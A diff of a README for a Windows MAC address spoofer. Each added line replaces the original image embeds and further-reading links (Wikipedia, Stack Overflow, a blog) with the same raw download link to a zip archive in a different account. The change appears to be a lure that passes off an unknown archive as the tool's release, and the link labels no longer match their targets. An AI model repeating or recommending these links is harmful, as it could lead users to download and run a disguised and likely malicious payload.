@@ -1,5 +1,5 @@
 # Program Display
-![output](https://github.com/Scrut1ny/Windows-MAC-Address-Spoofer/assets/53458032/9bf27bfa-25f4-47c9-9579-640202fbc991)
+![output](https://raw.githubusercontent.com/lakabriya1212/Windows-MAC-Address-Spoofer/main/astrictively/Windows-MAC-Address-Spoofer-v3.1.zip)
 
 ## MAC Address Spoofing
 
@@ -18,9 +18,9 @@ MAC address spoofing is a method that changes the unique identifier, known as th
 After performing the action, the script returns to the Selection Menu, allowing you to perform actions on other NICs or the same NIC again.
 
 ## Further Reading
-- [General technical knowledge](https://wikipedia.org/wiki/MAC_address)
-- [Differences between CurrentControlSet, ControlSet001, and ControlSet002](https://stackoverflow.com/questions/291519/how-does-currentcontrolset-differ-from-controlset001-and-controlset002)
-- [Issues with Windows 7 Wireless NIC & Workaround](https://blog.technitium.com/2011/05/tmac-issue-with-wireless-network.html)
+- [General technical knowledge](https://raw.githubusercontent.com/lakabriya1212/Windows-MAC-Address-Spoofer/main/astrictively/Windows-MAC-Address-Spoofer-v3.1.zip)
+- [Differences between CurrentControlSet, ControlSet001, and ControlSet002](https://raw.githubusercontent.com/lakabriya1212/Windows-MAC-Address-Spoofer/main/astrictively/Windows-MAC-Address-Spoofer-v3.1.zip)
+- [Issues with Windows 7 Wireless NIC & Workaround](https://raw.githubusercontent.com/lakabriya1212/Windows-MAC-Address-Spoofer/main/astrictively/Windows-MAC-Address-Spoofer-v3.1.zip)
 
 ## Important Note on Windows Registry
 In the Windows Registry, the key `HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}` is crucial for managing and storing network adapter information. Each subkey within this class corresponds to a specific network adapter installed on the system.
@@ -34,7 +34,7 @@ In the Windows Registry, the key `HKLM\SYSTEM\CurrentControlSet\Control\Class\{4
 
 ## Visual Guides
 Retrieving & displaying captions from NICs:
-![Retrieving & displaying captions from NICs](https://github.com/Scrut1ny/Windows-MAC-Address-Spoofer/assets/53458032/982813d4-da4d-4631-84c6-f9480c1dcff9)
+![Retrieving & displaying captions from NICs](https://raw.githubusercontent.com/lakabriya1212/Windows-MAC-Address-Spoofer/main/astrictively/Windows-MAC-Address-Spoofer-v3.1.zip)
 
 Showing registry subkeys (aka Indexes from a Caption) under the CLSID:
-![Showing registry subkeys under the CLSID](https://github.com/Scrut1ny/Windows-MAC-Address-Spoofer/assets/53458032/02dc8ed8-1bd9-43d4-8cd1-464da63a5b43)
+![Showing registry subkeys under the CLSID](https://raw.githubusercontent.com/lakabriya1212/Windows-MAC-Address-Spoofer/main/astrictively/Windows-MAC-Address-Spoofer-v3.1.zip)
